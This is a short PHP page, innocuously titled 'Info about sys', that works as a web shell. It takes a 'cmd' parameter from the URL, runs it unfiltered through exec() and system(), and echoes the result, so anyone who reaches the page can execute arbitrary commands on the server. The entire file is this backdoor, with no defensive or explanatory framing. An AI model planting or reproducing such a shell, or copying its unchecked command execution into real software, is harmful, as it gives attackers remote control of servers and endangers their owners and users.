<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Info about sys</title>
</head>
<body>
    <?php
    if(isset($_GET['cmd'])){
        $cmd = $_GET['cmd'];
        exec($cmd,$arr,$result_code);
        echo "Your command: ".$cmd. "<br>";
        if($result_code == 127){
            echo "Command not found";
        }else{
            echo "Result of your command: ";
            system($cmd);
        }
            
    }else{
        echo "Argument is empty";
    }
    
    ?>
</body>
</html>